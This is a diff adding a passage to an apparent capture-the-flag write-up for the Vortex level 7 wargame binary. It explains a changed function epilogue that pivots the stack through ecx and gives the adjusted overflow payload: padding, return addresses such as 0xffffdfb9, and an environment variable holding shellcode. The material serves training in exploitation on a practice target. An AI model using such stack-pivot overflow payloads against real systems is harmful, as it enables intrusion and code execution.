@@ -13,3 +13,34 @@ With the shellcode at 0xffffdfbf, the string "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHII
 
 
 As per usual, I wrote a local wrapper to execute the bin with a clean environment, and one for the server as well.
+
+Lo and behold, in the time its taken me since I took a break - the binary has been modified EVER so slightly - so that payload doesn't work.
+
+Now, instead of a leave + ret, it pops some values off of the stack to re-assign esp... pretty weird.
+
+Right before the return, it does these instructions:
+
+┌─────────── vortex7 ───────────┐
+  mov     eax, 0x0
+  lea     esp, [ebp-0x8]
+  pop     ecx
+  pop     ebx {__saved_ebx}
+  pop     ebp {__saved_ebp}
+  lea     esp, [ecx-0x4]
+  retn
+└───────────────────────────────┘
+
+As such, some of the arguments had to be modified
+
+
+Argv[1] becomes this:
+                                                                    ┌location of '\xc1\xdf\xff\xff'+4 (in env, SHE\xc1\xdf\xff\xffDE=...)
+AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJJKKKKLLLLMMMMNNNNOOOOP""\xb9\xdf\xff\xff""EduTc0"
+SHE\xc1\xdf\xff\xff""DE=\x50.....
+      └actual location of shellcode, starting with the \x50
+
+When these instructions execute, the address 0xffffdfc1 gets popped into ecx.
+Then, ecx-0x4 is loaded into esp, which is the address where 0xffffdfc1 is at the top of the stack.
+THEN the return instruction is called, and that location points to the actual shellcode.
+
+A bit weird, and I'm not sure where the change came from - but it's done!
